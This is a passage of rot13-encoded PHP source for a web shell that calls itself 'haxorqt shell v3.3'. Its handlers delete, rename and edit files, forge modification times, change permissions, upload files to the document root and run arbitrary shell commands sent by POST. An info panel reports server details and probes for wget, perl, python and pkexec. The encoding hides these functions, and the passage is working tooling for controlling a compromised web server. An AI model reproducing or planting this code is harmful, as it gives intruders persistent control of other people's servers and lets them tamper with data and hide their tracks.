            rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre-pbybe:erq;'><gq><pragre><sbag pbybe='erq'><v pynff='sn sn-rkpynzngvba-gevnatyr' nevn-uvqqra='gehr'></v> Snvyrq gb Qryrgr Svyr</sbag></pragre></gq></gnoyr>";
        } ryfr {
            rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre-pbybe:yvzr;'><gq><pragre><v pynff='sn sn-genfu'></v> Svyr erzbirq <sbag pbybe='yvzr'>".onfranzr($_CBFG['cngu'])."</sbag></pragre></gq></gnoyr>";
        }
    }
    rkvg();    
} ryfrvs (vffrg($_TRG['cvyvuna']) && $_CBFG['cvyvu'] == "tnagvanzn") {
    vs (vffrg($_CBFG['tnagva'])) {
        $anznoneh = $_TRG['cngu']."/".$_CBFG['arjanzr'];
        vs (@eranzr($_CBFG['cngu'], $anznoneh) === gehr) {
            rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre: 1ck fbyvq yvzr;'><gq><pragre><sbag pbybe='yvzr'>Punatr Anzr Fhpprff<pragre></gq></gnoyr><oe>";
            vs ($_CBFG['glcr'] == "svyr") {
                rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq><pragre>Svyranzr : <sbag pbybe='benatr'>".onfranzr($_CBFG['arjanzr'])."</sbag><oe><oe>";
            } ryfr {
                rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq><pragre><pragre>Sbyqre : <sbag pbybe='benatr'>".onfranzr($_CBFG['arjanzr'])."</sbag><oe>";
            }
            rpub '<sbez zrgubq="cbfg">
            <qvi pynff="vachg-tebhc zo-1" fglyr="jvqgu:300ck;">
            <vachg anzr="arjanzr" glcr="grkg" pynff="sbez-pbageby" fvmr="20" cynprubyqre="Arj anzr" />
            <vachg glcr="uvqqra" anzr="cngu" inyhr="'.$_CBFG['arjanzr'].'">
            <vachg glcr="uvqqra" anzr="cvyvu" inyhr="tnagvanzn">';
            vs ($_CBFG['glcr'] == "svyr") {
                rpub '<vachg glcr="uvqqra" anzr="glcr" inyhr="svyr">';
            } ryfr {
                rpub '<vachg glcr="uvqqra" anzr="glcr" inyhr="qve">';
            }
            rpub '<vachg glcr="fhozvg" inyhr="Punatr" anzr="tnagva" pynff="oga oga-bhgyvar-yvtug zo-1">
            </qvi></sbez></gq></gnoyr>';
        } ryfr {
            rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre: 1ck fbyvq erq;'><gq><pragre><sbag pbybe='erq'><v pynff='sn sn-rkpynzngvba-gevnatyr' nevn-uvqqra='gehr'></v> SNVYRQ GB PUNATR ANZR</sbag></pragre></gq></gnoyr>";
        }
    } ryfr {
        vs ($_CBFG['glcr'] == "svyr") {
            rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq><pragre>Svyranzr <sbag pbybe='benatr'>: ".onfranzr($_CBFG['cngu'], $_TRG['svyr'])."</sbag><oe><oe>";
        } ryfr {
            rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq><pragre>Sbyqre <sbag pbybe='benatr'>: ".onfranzr($_CBFG['cngu'])."</sbag><oe><oe>";
        }
        rpub '
        <sbez zrgubq="cbfg">
        <qvi pynff="vachg-tebhc zo-1" fglyr="jvqgu:300ck;">
        <vachg anzr="arjanzr" glcr="grkg" pynff="sbez-pbageby" fvmr="20" cynprubyqre="Arj anzr" />
        <vachg glcr="uvqqra" anzr="cngu" inyhr="'.$_CBFG['cngu'].'">
        <vachg glcr="uvqqra" anzr="cvyvu" inyhr="tnagvanzn">';
        vs ($_CBFG['glcr'] == "svyr") {
            rpub '<vachg glcr="uvqqra" anzr="glcr" inyhr="svyr">';
        } ryfr {
            rpub '<vachg glcr="uvqqra" anzr="glcr" inyhr="qve">';
        }
        rpub '<vachg glcr="fhozvg" inyhr="Punatr" anzr="tnagva" pynff="oga oga-bhgyvar-yvtug zo-1"/>
        </qvi></sbez></gq></gnoyr><oe>';
    } rkvg();
} ryfrvs (vffrg($_TRG['cvyvuna']) && $_CBFG['cvyvu'] == "rqvg") {
    vs (vffrg($_CBFG['tnfrqvg'])) {
        $rqvg = svyr_chg_pbagragf($_CBFG['cngu'], $_CBFG['fep']);
        vs ($rqvg == gehr) {
            rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre: 1ck fbyvq yvzr;'><gq><pragre><sbag pbybe='yvzr'>Svyr fnirq Fhpprffshyyl</sbag></pragre></gq></gnoyr><oe>";
        } ryfr {
            rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre: 1ck fbyvq erq;'><gq><pragre><sbag pbybe='erq'><v pynff='sn sn-rkpynzngvba-gevnatyr' nevn-uvqqra='gehr'></v> Pna'g fnir svyr/Crezvffvba Qravrq</sbag></pragre></gq></gnoyr><oe>";
        }
    }
    rpub "<pragre><gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq><pragre> Svyranzr : <sbag pbybe='benatr'>".onfranzr($_CBFG['cngu'])."</sbag><oe><oe>";
    rpub '<sbez zrgubq="cbfg">
    <qvi pynff="oga-tebhc zr-2" ebyr="tebhc" nevn-ynory="Svefg tebhc">
    <n uers="?cngu='.$freybx.'" pynff="oga oga-bhgyvar-yvtug"><v pynff="sn sn-neebj-yrsg"></v> onpx</n>
    <ohggba glcr="fhozvg" anzr="tnfrqvg" pynff="oga oga-bhgyvar-yvtug"fglyr="jvqgu:250ck;">
    <v pynff="sn sn-fnir"></v> Fnir</ohggba>
    <ohggba glcr="ohggba" pynff="oga oga-bhgyvar-yvtug" bapyvpx="zlShapgvba()"><v pynff="sn sn-pbcl"></v> Pbcl</ohggba></qvi><oe><oe>
    <grkgnern glcr="grkg" pbyf=120 vq="zlVachg" ebjf=30 anzr="fep">'.ugzyfcrpvnypunef(@svyr_trg_pbagragf($_CBFG['cngu'])).'</grkgnern><oe>
    <vachg glcr="uvqqra" anzr="cngu" inyhr="'.$_CBFG['cngu'].'">
    <vachg glcr="uvqqra" anzr="cvyvu" inyhr="rqvg">
    </sbez><oe></gq></gurnq></gnoyr><oe>'; rkvg();
} ryfrvs (vffrg($_TRG['cvyvuna']) && $_CBFG['cvyvu'] == "puqngrs") {
    $svyrqngr = onfranzr($_CBFG['cngu']);
      $gty = qngr("S q L t:v:f", svyrzgvzr($_CBFG['cngu']));
          rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq>
          <sbez zrgubq='cbfg'><pragre>
          <sbag pbybe='#sss'>Honu Gnattny<oe>Sbyqre :</sbag> <sbag pbybe='benatr'>$svyrqngr</sbag> 
          <oe>$gty<oe><oe><qvi pynff='vachg-tebhc zo-3' fglyr='jvqgu:280ck;'>         
          <vachg anzr='gnattny' glcr='grkg' pynff='sbez-pbageby' inyhr='".$_CBFG['gnattny']."' cynprubyqre='$gty'/>
          <vachg glcr='uvqqra' anzr='cngu' inyhr='".$_CBFG['cngu']."'>
          <vachg glcr='uvqqra' anzr='cvyvu' inyhr='puqngrs'>
          <ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-yvtug zo-1' anzr='punatr' inyhr='punatr'>Punatr</ohggba></qvi></sbez></pragre></gq></gnoyr>";
          vs (vffrg($_CBFG['punatr'])) {
        $gnattny = fgegbgvzr($_CBFG['gnattny']);
        vs (@gbhpu($_CBFG['cngu'], $gnattny) == gehr) {
          rpub "<oe><gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre: 1ck fbyvq yvzr;'><gq><pragre><sbag pbybe='yvzr'><pragre>Punatrq Fhpprffshyyl!!</sbag></pragre></gq></gnoyr>";
        } ryfr {
          rpub "<oe><gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre: 1ck fbyvq erq;'><gq><pragre><sbag pbybe='erq'><v pynff='sn sn-rkpynzngvba-gevnatyr' nevn-uvqqra='gehr'></v> Snvyrq gb punatr qngr!!</gq></gnoyr>";
        }
      }rkvg();
} ryfrvs (vffrg($_TRG['cvyvuna']) && $_CBFG['cvyvu'] == "puqngr") {
    $svyrqngr = onfranzr($_CBFG['cngu']);
      $gty = qngr("S q L t:v:f", svyrzgvzr($_CBFG['cngu']));
          rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq>
          <sbez zrgubq='cbfg'><pragre><sbag pbybe='#sss'>Honu Gnattny<oe>Svyr :</sbag> <sbag pbybe='benatr'>$svyrqngr <oe></sbag>$gty
          <oe><oe><qvi pynff='vachg-tebhc zo-3' fglyr='jvqgu:300ck;'>
          <vachg anzr='gnattny' glcr='grkg' pynff='sbez-pbageby' inyhr='".$_CBFG['gnattny']."' cynprubyqre='$gty'/>
          <vachg glcr='uvqqra' anzr='cngu' inyhr='".$_CBFG['cngu']."'>
          <vachg glcr='uvqqra' anzr='cvyvu' inyhr='puqngr'>
          <ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-yvtug zo-1' anzr='punatr' inyhr='punatr'>Punatr</ohggba>
          </qvi></sbez></pragre></gq></gnoyr>";
          vs (vffrg($_CBFG['punatr'])) {
        $gnattny = fgegbgvzr($_CBFG['gnattny']);
        vs (@gbhpu($_CBFG['cngu'], $gnattny) == gehr) {
          rpub "<oe><gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre: 1ck fbyvq yvzr;'><gq><pragre><sbag pbybe='yvzr'><pragre>Punatrq Fhpprffshyyl!!</sbag></pragre></gq></gnoyr>";
        } ryfr {
          rpub "<oe><gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre: 1ck fbyvq erq;'><gq><pragre><sbag pbybe='erq'><v pynff='sn sn-rkpynzngvba-gevnatyr' nevn-uvqqra='gehr'></v> Snvyrq gb punatr qngr!!</gq></gnoyr>";
        }
      }rkvg();
} ryfrvs (vffrg($_TRG['cvyvuna']) && $_CBFG['cvyvu'] == "puzbqs") {
    $svyrf = onfranzr($_CBFG['cngu']);
    $foe = 'fhofge'; $fce = 'fcevags'; $sycrez = 'svyrcrezf';
      rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq>
      <oe><pragre> <sbag pbybe='#sss'>Sbyqre : <sbag pbybe='benatr'>$svyrf</sbag> (".$foe($fce('%b',$sycrez($_CBFG['cngu'])), -4).")<oe><oe>
      <sbez zrgubq='cbfg'>
      <qvi pynff='vachg-tebhc zo-3' fglyr='jvqgu:230ck;'>
    <vachg glcr='grkg' anzr='zbq1' znkyratgu='4' pynff='sbez-pbageby' urvtug='10' inyhr='".$_CBFG['zbq1']."' cynprubyqre='0755' erdhverq/> 
    <vachg glcr='uvqqra' anzr='cngu' inyhr='".$_CBFG['cngu']."'>
    <vachg glcr='uvqqra' anzr='cvyvu' inyhr='puzbqs'>
    <ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-yvtug zo-1' anzr='tnagv' inyhr='tnagv'>Punatr</ohggba>
    </qvi></sbez></gq></gnoyr>";
    vs (vffrg($_CBFG['tnagv'])) {
      $bcrg = @puzbq($_CBFG['cngu'], bpgqrp($_CBFG['zbq1']));
    vs ($bcrg == gehr) {
        rpub "<oe><gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre: 1ck fbyvq yvzr;'><gq><pragre><sbag pbybe='yvzr'>Punatrq Fhpprffshyyl!!</sbag></pragre></gq></gnoyr>";
        } ryfr {
            rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre: 1ck fbyvq erq;'><gq><pragre><sbag pbybe='erq'><v pynff='sn sn-rkpynzngvba-gevnatyr' nevn-uvqqra='gehr'></v> Snvyrq gb punatr!!</sbag></pragre></gq></gnoyr>";
        }
      }rkvg();
} ryfrvs (vffrg($_TRG['cvyvuna']) && $_CBFG['cvyvu'] == "puzbq") {
    $svyrf = onfranzr($_CBFG['cngu']);
    $foe = 'fhofge'; $fce = 'fcevags'; $sycrez = 'svyrcrezf';
      rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq>
      <pragre><sbag pbybe='#sss'>Svyranzr : <sbag pbybe='benatr'>$svyrf</sbag> (".$foe($fce('%b',$sycrez($_CBFG['cngu'])), -4).")<oe><oe>
      <sbez zrgubq='cbfg'>
      <qvi pynff='vachg-tebhc zo-3' fglyr='jvqgu:230ck;'>
    <vachg glcr='grkg' anzr='zbq1' pynff='sbez-pbageby' znkyratgu='4' urvtug='10' inyhr='".$_CBFG['zbq1']."' cynprubyqre='0644' erdhverq/> 
    <vachg glcr='uvqqra' anzr='cngu' inyhr='".$_CBFG['cngu']."'>
    <vachg glcr='uvqqra' anzr='cvyvu' inyhr='puzbq'>
    <oe><oe><ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-yvtug zo-1' anzr='tnagv' inyhr='tnagv'>Punatr</ohggba></qvi>
    </sbez></gq></gnoyr>";
    vs (vffrg($_CBFG['tnagv'])) {
      $bcrg = @puzbq($_CBFG['cngu'], bpgqrp($_CBFG['zbq1']));
    vs ($bcrg == gehr) {
        rpub "<oe><gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre: 1ck fbyvq yvzr;'><gq><pragre><sbag pbybe='yvzr'>Punatrq Fhpprffshyyl!!</sbag></pragre></gq></gnoyr>";
        } ryfr {
            rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre: 1ck fbyvq erq;'><gq><pragre><sbag pbybe='erq'><v pynff='sn sn-rkpynzngvba-gevnatyr' nevn-uvqqra='gehr'></v> Snvyrq gb punatr!!</sbag></pragre></gq></gnoyr>";
        }
      }rkvg();
} ryfrvs (vffrg($_TRG['cvyvuna']) && $_CBFG['cvyvu'] == "hamvc") {
    hamvc($_CBFG['cngu'], $freybx);

} ryfrvs ($_ERDHRFG[arg('hcybnq')] == "bcrg") {
    rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq><pragre>
    <sbez zrgubq='CBFG' rapglcr='zhygvcneg/sbez-qngn' vq='hcybnq'><u5><v pynff='sn sn-hcybnq'></v> HCYBNQ SVYRF<u5>
    <qvi pynff='vachg-tebhc' fglyr='jvqgu:360ck;'>
    <vachg glcr='svyr' anzr='unkbedgsvyr' vq='unkbedg' fglyr='onpxtebhaq-pbybe: terl;' pynff='sbez-pbageby' anzr='hcybq'>
    <vachg glcr='fhozvg' pynff='oga oga-bhgyvar-yvtug' sbe='vachgTebhcSvyr02' anzr='hcybq' inyhr='Hcybnq'></qvi>
              </sbez></pragre></gq></gnoyr>";
     vs (vffrg($_CBFG['hcybq'])) {
        vs ($_CBFG['qvealn'] == "2") {
            $freybx = $_FREIRE['QBPHZRAG_EBBG'];
        }
        vs (rzcgl($_SVYRF['unkbedgsvyr']['anzr'])) {
            rpub "<oe><gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre-pbybe:benatr;'><gq><sbag pbybe='benatr'><pragre><v pynff='sn sn-rkpynzngvba-gevnatyr' nevn-uvqqra='gehr'></v> Svyr abg fryrpgrq</pragre></sbag>";
        } ryfr {
            $qngn = @svyr_chg_pbagragf($freybx."/".$_SVYRF['unkbedgsvyr']['anzr'], @svyr_trg_pbagragf($_SVYRF['unkbedgsvyr']['gzc_anzr']));
                vs (svyr_rkvfgf($freybx."/".$_SVYRF['unkbedgsvyr']['anzr'])) {
                    $sy = $freybx."/".$_SVYRF['unkbedgsvyr']['anzr'];
                    rpub "<oe><gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre-pbybe:yvzr;'><gq>
                    Hcybnqrq => <sbag pbybe='yvzr'><v>".$_SVYRF['unkbedgsvyr']['anzr']."</v></sbag><oe>";
                    vs (fgecbf($freybx, $_FREIRE['QBPHZRAG_EBBG']) !== snyfr) {
                        $yjo = fge_ercynpr($_FREIRE['QBPHZRAG_EBBG'], $jro."/", $sy);
                        rpub "Yvax : <n uers='".$yjo."' gnetrg='_oynax'><sbag pbybe='yvzr'>Pyvpx urer</sbag></n></gq></gnoyr><oe>";
                    }
                    rpub "<oe>";
                } ryfr {
                    rpub "<oe><gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre-pbybe:erq;'><gq><sbag pbybe='erq'><pragre>Gurer jnf na reebe hcybnqvat lbhe svyr.</sbag></gq></gnoyr>";
            }
        }
    }rkvg(); 

} ryfrvs ($_TRG[arg('pzq')] == "bcrg") {
    rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq>";
    rpub '<oe><sbez zrgubq="cbfg"><pragre>
    <qvi pynff="vachg-tebhc" fglyr="jvqgu:600ck;">
    <fcna pynff="vachg-tebhc-grkg zo-1">Pbzznaq :</fcna>
     <vachg glcr="grkg" pynff="sbez-pbageby" anzr="xbzra" vq="pbznaqaln" inyhr="'.$_CBFG['xbzra'].'" cynprubyqre="hanzr -n" erdhverq>
    <ohggba glcr="fhozvg" anzr="pbznaqrxf" inyhr="rkrphgr" pynff="oga oga-bhgyvar-yvtug zo-1">>></ohggba></qvi></sbez><oe><pragre>';
    vs (vffrg($_CBFG['pbznaqrxf'])) {
        rxfr($_CBFG['xbzra'], $freybx);
    }
    rpub "</pragre></gq></gnoyr><oe></pragre>";
    rkvg();
} ryfrvs ($_ERDHRFG[arg('nobhg')] == "bcrg") {
    rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gurnq><gq><qvi fglyr='sbag-snzvyl: Ohatrr Bhgyvar;sbag-fvmr:24ck;'>
    <vzt pynff='pebg' fep='uggcf://v.cvavzt.pbz/564k/84/0r/4p/840r4p57sno2on6279o377nr8qp333q3.wct'/> Cevi furyy hjh rqvgvba</qvi><ue>
    <oe> - unkbedg furyy i3.3 <oe> - Perngrq ol unkbedg</gq></gurnq></gnoyr>"; rkvg();
} ryfrvs ($_ERDHRFG[arg('ohngsvyr')] == "bcrg") {
    shapgvba perngrsvyr(){
        $cng = $_TRG['cngu'];
        $anzn_svyr = $_CBFG['anzn_svyr'];
        $vfv_svyr = $_CBFG['vfv_svyr'];
        $unaqyr = sbcra("$cng/$anzn_svyr", 'j');
        $svyrf = $_TRG['cngu']."/".$anzn_svyr;
        $nfh = fge_ercynpr($_FREIRE['QBPHZRAG_EBBG'], $jro. "", $svyrf);
        vs (sjevgr($unaqyr, $vfv_svyr)) {
            rpub '<gnoyr pynff="qverpgbel-yvfgvat-gnoyr" fglyr="obeqre-pbybe:yvzr;"><gq>Perngrq =>&aofc;<sbag pbybe="yvzr">'.$cng.'/'.$anzn_svyr.'<oe></sbag>Yvax : <n uers="'.$nfh.'" gnetrg="_oynax"><sbag pbybe="ndhn"><v>Pyvpx urer</v></n></sbag></gq></gnoyr>';
        } ryfr {
            rpub '<gnoyr pynff="qverpgbel-yvfgvat-gnoyr" fglyr="obeqre-pbybe:erq;"><gq><sbag pbybe=erq><v pynff="sn sn-rkpynzngvba-gevnatyr" nevn-uvqqra="gehr"></v> Snvyrq gb perngr svyr..!!</sbag></fpevcg></gq></gnoyr>';
        }
    } vs(!vffrg($_CBFG['ovxva'])) {
        rpub "<pragre><gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gq jvqgu='12%''>
    <sbez zrgubq='CBFG'>
        <vachg glcr='grkg' inyhr='svyr.cuc' cynprubyqre='Anzn Svyr' fglyr='jvqgu: 525ck;' anzr='anzn_svyr' nhgbpbzcyrgr='bss'><oe><oe>
        <grkgnern anzr='vfv_svyr' ebjf='20' pbyf='100' cynprubyqre='Uryyb Jbeyq!'></grkgnern><oe>
        <ohggba glcr='fhzovg' pynff='oga oga-bhgyvar-yvtug' fglyr='jvqgu:200ck; urvtug:36ck;' urvtug:30;' anzr='ovxva'>PERNGR</ohggba>&aofc;
        <n uers='?cngu=".$freybx."' pynff='oga oga-bhgyvar-yvtug'>Onpx</n><oe>
    </sbez></pragre>";
        } ryfr {
            perngrsvyr();
        }rkvg();
} ryfrvs ($_TRG[arg('ohngsbyqre')] == "bcrg") {
      shapgvba perngrQverpgbel() {
        vs (rzcgl($_CBFG['nqq'])) {
        rpub '<gnoyr pynff="qverpgbel-yvfgvat-gnoyr" fglyr="obeqre-pbybe:benatr;"><gq><sbag pbybe="benatr">Sbyqre svryq vf erdhverq</sbag> [<n uers="?cngu='.$_TRG['cngu'].'&'.arg("ohngsbyqre").'=bcrg"><v pynff="sn-fbyvq sn-sbyqre-cyhf" nevn-uvqqra="gehr"></v>Perngr ntnva</n>]</gq></gnoyr>';
        } ryfr {
        $nqq = $_CBFG["nqq"];
        $unkbedg = zxqve($_TRG['cngu']."/".$nqq);
        vs ($unkbedg == gehr) {
            rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre-pbybe:yvzr;'><gq>Perngrq =><sbag pbybe=yvzr> ".$_TRG['cngu']."/</sbag><sbag pbybe='benatr'>$nqq</sbag><oe>
            <n uers='?cngu=".$_TRG['cngu']."/$nqq'><h>Pyvpx Urer</h></n></gq></gnoyr>";
    } ryfr {
            rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' fglyr='obeqre-pbybe:erq;'><gq><sbag pbybe=erq><v pynff='sn sn-rkpynzngvba-gevnatyr' nevn-uvqqra='gehr'></v> Snvyrq gb perngr sbyqre : $nqq</sbag></gq></gnoyr>";
                }
        }
}
        vs (!vffrg($_CBFG['fhozvg'])) {
            rpub '<gnoyr pynff="qverpgbel-yvfgvat-gnoyr"><gq>
        <sbez npgvba="" zrgubq = "CBFG"><u5><v pynff="sn sn-sbyqre-cyhf"></v> Perngr Sbyqre</u5><ue><pragre>
        <qvi fglyr="jvqgu:300ck;">
         <vachg glcr="grkg" pynff="sbez-pbageby" cynprubyqre="Sbyqre Anzr" anzr="nqq" vq="nqq"/><oe></qvi>
        <ohggba glcr="fhozvg" pynff="oga oga-bhgyvar-yvtug" anzr="fhozvg" inyhr="Perngr qverpgbel" fglyr="jvqgu:120ck;">Perngr</ohggba>&aofc;
        <n uers="?cngu='.$freybx.'" pynff="oga oga-bhgyvar-yvtug" fglyr="jvqgu:120ck;">Onpx</n><oe><oe></sbez></gq></gnoyr>';
        } ryfr {
            perngrQverpgbel();
        }rkvg();
} ryfrvs ($_ERDHRFG[arg('vasb')] == "bcrg") {
    rpub "<gnoyr pynff='qverpgbel-yvfgvat-gnoyr' nyvta='pragre'>
    <qvi vq='pbagrag'><ge><gq>";
    rpub "Freire : <sbag pbybe=benat>".$_FREIRE['UGGC_UBFG']."</sbag><oe>";
    rpub "Freire VC : <sbag pbybe=benatr>".vcfrei()."</sbag> &aofc;<oe> Lbhe VC : <sbag pbybe=benatr>".$_FREIRE['ERZBGR_NQQE']."</sbag><oe>";
    rpub "Jro Freire : <sbag pbybe='benatr'>".$_FREIRE['FREIRE_FBSGJNER']."</sbag><oe>";
    rpub "Flfgrz : <sbag pbybe='benatr'>".cuc_hanzr()."</sbag><oe>";
    rpub "Hfre : <sbag pbybe='benatr'>".@trg_pheerag_hfre()."&aofc;</sbag>( <sbag pbybe='benatr'>".@trgzlhvq()."</sbag>)<oe>";
    rpub "CUC Irefvba : <sbag pbybe='benatr'>".@cucirefvba()."&aofc;</sbag>=><sbag pbybe='benatr'>&aofc;".cuc_fncv_anzr()."</sbag><oe>";
    rpub "</ge></gq><ge><gq>Qvfnoyr Shapgvba : ".$qvfs."</sbag>";
    rpub "</qvi></ge></gq><ge><gq>";
    rpub "<ue>Berpyr : ";
vs (shapgvba_rkvfgf('bpv_pbaarpg')) {
        rpub "<sbag pbybe=yvzr>BA</sbag>";
} ryfr {
    rpub "<sbag pbybe=erq>BSS</sbag>";

    rpub "&aofc;| FFU2 : ";
}

vs (shapgvba_rkvfgf('ffu2_pbaarpg')) {
    rpub "<sbag pbybe=yvzr>BA</sbag>";
} ryfr {
    rpub "<sbag pbybe=erq>BSS</sbag>";

    rpub "&aofc;| ZlFDY : ";
}
vs (shapgvba_rkvfgf("zlfdy_pbaarpg")) {
    rpub "<sbag pbybe=yvzr>BA</sbag>";
} ryfr {
    rpub "<sbag pbybe=erq>BSS</sbag>";
}
rpub " &aofc;| pHEY : ";
vs (shapgvba_rkvfgf("phey_vavg")) {
    rpub "<sbag pbybe=yvzr>BA</sbag>";
} ryfr {
    rpub "<sbag pbybe=erq>BSS</sbag>";
}
rpub " &aofc;| JTRG : ";
vs (svyr_rkvfgf("/hfe/ova/jtrg")) {
    rpub "<sbag pbybe=yvzr>BA</sbag>";
} ryfr {
    rpub "<sbag pbybe=erq>BSS</sbag>";
}
rpub " &aofc;| Crey : ";
vs (svyr_rkvfgf("/hfe/ova/crey")) {
    rpub "<sbag pbybe=yvzr>BA</sbag>";
} ryfr {
    rpub "<sbag pbybe=erq>BSS</sbag>";
}
rpub " &aofc;| Clguba : ";
vs (svyr_rkvfgf("/hfe/ova/clguba2")) {
    rpub "<sbag pbybe=yvzr>BA</sbag>";
} ryfr {
    rpub "<sbag pbybe=erq>BSS</sbag>";
}
$cxrkrp = (@furyy_rkrp("cxrkrp --irefvba")) ? "<sbag pbybe='yvzr'>BA</sbag>" : "<sbag pbybe='erq'>BSS</sbag>";
    rpub " | CXRKRP : $cxrkrp<oe><oe>";
    rpub "</ge></gq></gnoyr><oe>";
    rkvg();

}


vs (!vf_ernqnoyr($freybx)) {
    qvr("<gnoyr pynff='qverpgbel-yvfgvat-gnoyr'><gurnq><gq><pragre><sbag pbybe=benatr>Guvf qverpgbel vf haernqnoyr :(</sbag></pragre></gq></gurnq></gnoyr>");
}

rpub '<gnoyr pynff="gnoyr gnoyr-qnex gnoyr-ubire" fglyr="obk-funqbj: 0 0 20ck oynpx;jvqgu:90%;obeqre-yrsg:1ck fbyvq #ssp107;obeqre-evtug:1ck fbyvq #ssp107;obeqre-obggbz:1ck fbyvq #ssp107;--of-obeqre-enqvhf:80erz;" nyvta="pragre">
<gurnq fglyr="--of-gnoyr-ot:#ssp107;--of-gnoyr-pbybe:#000;"><ge>
<gu><pragre>Anzr</pragre></gu>
<gu><pragre>Fvmr</pragre></gu>
<gu><pragre>Ynfg Zbqvsvrq</pragre></gu>
<gu><pragre>Bjare</pragre></gu>
<gu><pragre>Crezvffvbaf</pragre></gu>
<gu><pragre>Npgvbaf</pragre></gu>
</ge></gurnq><pragre>';
$fpq = "\163\143"."\141\156\144"."\151\162";
vs(vf_ernqnoyr($freybx)){
            $srgpu=$fpq($freybx);
            $freybxobf=neenl();
            $svyrm=neenl();
            sbernpu($srgpu nf $sbyf){
                vs($sbyf=='.'||$sbyf=='..'){
                    pbagvahr;
                }
                    $unkbedgf=$freybx.'/'.$sbyf;
                    vs(vf_qve($unkbedgf)){
                        neenl_chfu($freybxobf,$sbyf);
                    }ryfrvs(vf_svyr($unkbedgf)){
                        neenl_chfu($svyrm,$sbyf);
                    }
                }
            }
sbernpu($freybxobf nf $qve){
    rpub "<ge>
    <gq><v pynff='sn sn-sbyqre' fglyr='pbybe: #SNN625'></v> <n uers=\"?cngu=".$freybx."/".$qve."\">".$qve."</n></gq>
    <gq><pragre>Qve</pragre></gq>
    <gq><pragre>".svyrqngr($freybx."/".$qve)."</pragre></gq>
    <gq>".bjare($freybx."/".$qve)."</gq>
    <gq><pragre>";
    vs(vf_jevgnoyr($freybx."/".$qve)) rpub '<sbag pbybe="yvzr">';
    ryfrvs(!vf_ernqnoyr($freybx."/".$qve)) rpub '<sbag pbybe="erq">';
    rpub fgnghfaln($freybx."/".$qve);
    vs(vf_jevgnoyr($freybx."/".$qve) || !vf_ernqnoyr($freybx."/".$qve)) rpub '</sbag>';

    rpub "</pragre></gq>
    <gq><pragre><sbez zrgubq=\"CBFG\" npgvba=\"?cvyvuna&cngu=$freybx\">
    <qvi pynff='oga-tebhc zr-2' ebyr='tebhc' nevn-ynory='Svefg tebhc'>
    <ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-frpbaqnel onqtr-npgvba-eranzr' anzr='cvyvu' inyhr='tnagvanzn'>
    <v pynff='sn sn-crapvy' fglyr='pbybe: #sss'></v></ohggba>
    <ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-frpbaqnel onqtr-npgvba-puzbq' anzr='cvyvu' inyhr='puzbqs'><v pynff='sn sn-trne' fglyr='pbybe: #06Q2Q5'></v></ohggba>
    <ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-frpbaqnel onqtr-npgvba-gnattny' anzr='cvyvu' inyhr='puqngrs'><v pynff='sn sn-pnyraqne' fglyr='pbybe: #5654S5'></v></ohggba>
    <ohggba glcr='fhozvg' pynff='oga oga-bhgyvar-frpbaqnel onqtr-npgvba-qryrgr' anzr='cvyvu' inyhr='unchf'><v pynff='sn sn-genfu' fglyr='pbybe: #R53N3N'></v></ohggba></qvi>
    <vachg glcr=\"uvqqra\" anzr=\"glcr\" inyhr=\"qve\">
    <vachg glcr=\"uvqqra\" anzr=\"anzr\" inyhr=\"$qve\">
    <vachg glcr=\"uvqqra\" anzr=\"cngu\" inyhr=\"$freybx/$qve\">
    </sbez></pragre></gq>
    </ge>";
}

sbernpu($svyrm nf $svyr) {
    vs(!vf_svyr("$freybx/$svyr")) pbagvahr;
        $fvmr = svyrfvmr("$freybx/$svyr")/1024;
        $fvmr = ebhaq($fvmr,3);
        vs($fvmr >= 1024){
        $fvmr = '<sbag pbybe="ndhn">'.ebhaq($fvmr/1024,2).'</sbag> ZO';
    } ryfr {
        $fvmr = '<sbag pbybe="#R6S01P">'.$fvmr.'</sbag> XO';
    }
rpub "<ge>
<gq>".prxsvyr($freybx."/".$svyr)."
<n uers=\"?ivrjsvyr=".$freybx."/$svyr&cngu=".$freybx."\">$svyr</n></gq>
<gq><pragre>".$fvmr."</pragre></gq>
